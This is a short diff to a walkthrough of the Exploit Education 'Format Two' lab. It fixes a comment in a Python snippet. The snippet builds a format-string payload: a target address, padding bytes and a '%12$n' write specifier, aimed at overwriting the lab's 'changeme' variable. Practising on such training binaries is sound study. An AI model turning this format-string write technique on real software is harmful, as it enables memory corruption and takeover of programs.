@@ -150,7 +150,7 @@ Welcome to Format Two, brought to you by https://exploit.education
 Okay so 12th argument hits our input, lets craft a payload 
 
 ```python
-payload = p32(0x5655900c) // Address of changeme at runtime using GDB
+payload = p32(0x5655900c) # Address of changeme at runtime using GDB
 payload += b'\x90'*12
 payload += b'%12$n'
 open('payload_f2','wb').write(payload)
